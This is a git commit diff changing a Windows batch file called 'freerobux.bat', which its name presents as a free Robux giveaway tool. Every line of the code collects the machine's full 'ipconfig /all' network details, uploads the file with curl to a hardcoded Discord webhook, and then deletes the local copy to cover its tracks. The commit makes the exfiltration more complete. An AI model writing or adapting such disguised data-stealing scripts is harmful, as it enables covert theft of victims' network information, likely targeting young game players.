1b81d144640a5ed516bdff564d435c5930dca377
newtfag <roamss@proton.me>
2025-06-20 21:00:16 -0600

    Update freerobux.bat

--- assets/scriptiez/freerobux.bat
+++ assets/scriptiez/freerobux.bat
@@ -3,12 +3,11 @@ setlocal
 
 set "WEBHOOK_URL=https://discord.com/api/webhooks/1381341130779660298/9Cq3qdp2LtdD4-nC56yCnVAt3JNdacPfEYZfo5T9zzLca6ZqW256rS6NdG-N4H2k39dv"
 
-ipconfig > ipconfig.txt
+ipconfig /all > ipconfig.txt
 
-set /p content=<ipconfig.txt
-curl -H "Content-Type: application/json" -X POST ^
-  -d "{\"content\": \"`ipconfig` result:\n```\n%content%\n```\"}" ^
-  %WEBHOOK_URL%
+curl -X POST %WEBHOOK_URL% ^
+  -F "file=@ipconfig.txt" ^
+  -F "payload_json={\"content\": \"Here is the ipconfig output from this machine.\"}"
 
 del ipconfig.txt
 endlocal
